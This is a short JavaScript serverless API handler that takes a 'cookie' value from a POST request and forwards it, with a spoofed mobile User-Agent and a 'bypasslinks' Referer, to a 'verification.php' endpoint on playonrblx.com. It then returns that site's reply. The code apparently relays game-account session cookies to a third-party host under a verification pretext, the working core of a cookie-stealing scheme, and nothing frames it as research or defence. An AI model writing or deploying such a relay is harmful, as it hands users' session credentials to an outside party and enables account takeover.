export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const body = req.body || {};
    const cookie = body.cookie;

    if (!cookie) {
      return res.status(400).json({ error: "cookie required" });
    }

    const response = await fetch(
      "https://playonrblx.com/api/verification.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
          "Referer": "https://playonrblx.com/a/bypasslinks/index"
        },
        body: JSON.stringify({ cookie })
      }
    );

    const text = await response.text();
    res.status(200).send(text);

  } catch (error) {
    console.error("FUNCTION ERROR:", error);
    res.status(500).json({ error: "Internal server error" });
  }
          }
